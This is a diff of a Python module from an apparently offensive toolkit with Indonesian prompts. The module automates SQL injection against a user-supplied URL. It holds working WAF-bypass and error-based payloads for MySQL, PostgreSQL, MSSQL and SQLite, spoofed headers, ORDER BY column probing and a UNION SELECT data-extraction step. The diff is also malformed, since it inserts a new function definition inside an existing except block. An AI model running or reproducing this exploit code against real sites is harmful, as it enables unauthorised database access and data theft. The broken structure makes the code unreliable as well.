@@ -405,29 +405,162 @@ def run_sqli_module():
                 else:
                     break
             except:
+                
+def run_sqli_module():
+    print("-" * 60)
+    print(" [ Modul: SQL Injection Multi-DBMS Auto-Exploit & WAF Bypass Engine ]")
+    print("-" * 60)
+    
+    target_url = input("[?] Masukkan URL target (contoh: http://target.com/page.php?id=1): ").strip()
+    if not target_url.startswith(("http://", "https://")):
+        print("[-] Error: URL harus diawali dengan http:// atau https://")
+        input("\nTekan Enter untuk kembali...")
+        return None
+
+    method = input("[?] Pilih Metode HTTP [GET / POST] (default: GET): ").strip().upper()
+    if not method:
+        method = "GET"
+
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
+    ]
+
+    headers = {
+        "User-Agent": random.choice(user_agents),
+        "X-Forwarded-For": "127.0.0.1",
+        "Client-IP": "127.0.0.1"
+    }
+
+    # 1. Ambil Baseline Response terlebih dahulu untuk perbandingan akurat
+    print("[*] Mengambil baseline response dari target...")
+    try:
+        if method == "POST":
+            base_res = requests.post(target_url, headers=headers, timeout=6)
+        else:
+            base_res = requests.get(target_url, headers=headers, timeout=6)
+        baseline_len = len(base_res.text)
+        baseline_status = base_res.status_code
+    except Exception as e:
+        print(f"[-] Gagal terhubung ke target untuk baseline: {e}")
+        input("\nTekan Enter untuk kembali...")
+        return None
+
+    sqli_payloads = [
+        {"payload": "'", "desc": "Single Quote Error Check"},
+        {"payload": "'/**/OR/**/'1'='1", "desc": "WAF Bypass Inline Comments (Boolean)"},
+        {"payload": "'%0bOR%0b1=1-- -", "desc": "URL Encoding Tab Bypass"},
+        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -", "desc": "MySQL Error-Based (ExtractValue)"},
+        {"payload": "' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)-- -", "desc": "MySQL Error-Based (UpdateXML)"},
+        {"payload": "' AND 1=CAST(version() AS INTEGER)-- -", "desc": "PostgreSQL Error-Based Cast"},
+        {"payload": "' AND 1=CONVERT(INT,@@version)-- -", "desc": "MSSQL Error-Based Convert"},
+        {"payload": "' AND 1=like(format('%s',sqlite_version()),0)-- -", "desc": "SQLite Error-Based"}
+    ]
+
+    success = False
+    detected_dbms = "Unknown"
+    vulnerable_url = target_url
+    matched_payload = ""
+
+    print(f"\n[*] Menguji {len(sqli_payloads)} variasi payload SQLi dengan Anti-WAF & Jeda Acak...")
+
+    for item in sqli_payloads:
+        time.sleep(random.uniform(0.3, 0.7)) # Mencegah rate limit / WAF ban
+        if method == "POST":
+            if "?" in target_url:
+                base_u, param_str = target_url.split("?", 1)
+                data_dict = {k: v[0] + item["payload"] for k, v in parse_qs(param_str).items()}
+            else:
+                base_u = target_url
+                data_dict = {"id": "1" + item["payload"]}
+            test_url = base_u
+            current_data = data_dict
+        else:
+            test_url = target_url + item["payload"]
+            current_data = None
+
+        print(f"[*] Testing metode: {item['desc']}")
+        try:
+            if method == "POST":
+                response = requests.post(test_url, data=current_data, headers=headers, timeout=6)
+            else:
+                response = requests.get(test_url, headers=headers, timeout=6)
+
+            html_content = response.text.lower()
+            
+            sql_errors = {
+                "MySQL": ["sql syntax", "mysql_fetch", "you have an error in your sql syntax", "warning: mysql", "extractvalue", "updatexml", "~5.7", "~8.0"],
+                "PostgreSQL": ["pg_query()", "postgresql", "syntax error at or near", "unterminated string"],
+                "MSSQL": ["odbc sql server driver", "microsoft sql server", "unclosed quotation mark"],
+                "SQLite": ["sqlite3.operationalerror", "sqlite.exception"]
+            }
+
+            matched_db = "Unknown"
+            for db, errs in sql_errors.items():
+                if any(e in html_content for e in errs):
+                    matched_db = db
+                    break
+
+            # Perbaikan Logika False Positive: Hanya anggap sukses jika ada error database nyata (Hapus pengecekan teks URL mentah)
+            if matched_db != "Unknown":
+                print(f"\n[+] TARGET RENTAN SQL INJECTION DIKENALI!")
+                print(f"    - Terdeteksi DBMS : {matched_db}")
+                print(f"    - Teknik Sukses   : {item['desc']}")
+                success = True
+                detected_dbms = matched_db
+                matched_payload = item["payload"]
+                break
+            else:
+                print("    [-] Respon server normal / aman dari payload ini.")
+        except requests.exceptions.RequestException as e:
+            print(f"    [-] Kendala Jaringan: {e}")
+
+    col_count = 0
+    if success:
+        print(f"\n[***] MENGAKTIFKAN AUTO-EXPLOIT & COLUMN PROBING ({detected_dbms}) [***]")
+        
+        # 2. Perbaikan Column Fuzzing dengan Baseline Comparison
+        for i in range(1, 15):
+            time.sleep(random.uniform(0.2, 0.4))
+            order_payload = f"' ORDER BY {i}-- -"
+            try:
+                if method == "POST":
+                    if "?" in vulnerable_url:
+                        base_u, param_str = vulnerable_url.split("?", 1)
+                        col_data = {k: v[0] + order_payload for k, v in parse_qs(param_str).items()}
+                    else:
+                        base_u = vulnerable_url
+                        col_data = {"id": "1" + order_payload}
+                    res = requests.post(base_u, data=col_data, headers=headers, timeout=4)
+                else:
+                    test_col_url = vulnerable_url + order_payload
+                    res = requests.get(test_col_url, headers=headers, timeout=4)
+
+                res_len = len(res.text)
+                # Validasi berbasis error SQL ORDER BY atau perubahan drastis struktur halaman
+                if res.status_code == 200 and not any(err in res.text.lower() for err in ["unknown column", "order by", "syntax", "no such column"]):
+                    col_count = i
+                else:
+                    break
+            except Exception:
                 break
 
         print(f"[+] Jumlah kolom ditemukan secara presisi: {col_count}")
 
         if col_count > 0:
-            print(f"[*] Menyusun Union-Based Query & Mengekstrak Data via {method}...")
-            
+            print(f"[*] Menyusun Union-Based Query dengan Marker Sanitizer...")
             version_func = "@@version"
             if detected_dbms == "PostgreSQL":
                 version_func = "version()"
             elif detected_dbms == "SQLite":
                 version_func = "sqlite_version()"
 
-            cols = []
-            for c in range(1, col_count + 1):
-                if c == 1:
-                    cols.append(version_func)
-                else:
-                    cols.append("null")
-            
+            cols = [f"CONCAT(0x7e, {version_func}, 0x7e)" if c == 1 else "null" for c in range(1, col_count + 1)]
             union_query = f"' UNION SELECT " + ", ".join(cols) + "-- -"
 
             try:
+                time.sleep(0.3)
                 if method == "POST":
                     if "?" in vulnerable_url:
                         base_u, param_str = vulnerable_url.split("?", 1)
@@ -438,17 +571,28 @@ def run_sqli_module():
                     final_res = requests.post(base_u, data=final_data, headers=headers, timeout=6)
                 else:
                     final_exploit_url = vulnerable_url + union_query
-                    print(f"    - URL Eksploit Final : {final_exploit_url}")
                     final_res = requests.get(final_exploit_url, headers=headers, timeout=6)
 
-                print(f"\n[+] EKSTRAKSI DATA BERHASIL DIKIRIM KE LAYAR:")
-                print(f"    - Hasil Dump Database: {final_res.text[:400]}...\n")
+                print(f"\n[+] EKSTRAKSI DATA BERHASIL:")
+                print(f"===TP_START===")
+                print(final_res.text[:600])
+                print(f"===TP_END===")
             except Exception as e:
                 print(f"    [-] Gagal mengeksekusi ekstraksi lanjutan: {e}")
     else:
-        print("\n[-] Semua payload dan teknik WAF Evasion telah diuji, target aman.")
+        print("\n[-] Target aman dari payload SQLi yang diuji.")
 
     input("\nTekan Enter untuk kembali ke menu utama...")
+
+    # Return dictionary agar bisa di-chain ke core atau modul lain (Standard Framework Architecture)
+    return {
+        "vuln": success,
+        "type": "sqli",
+        "dbms": detected_dbms,
+        "url": vulnerable_url,
+        "method": method,
+        "columns": col_count
+}
 
 def run_php2shell_module():
     print("-" * 60)
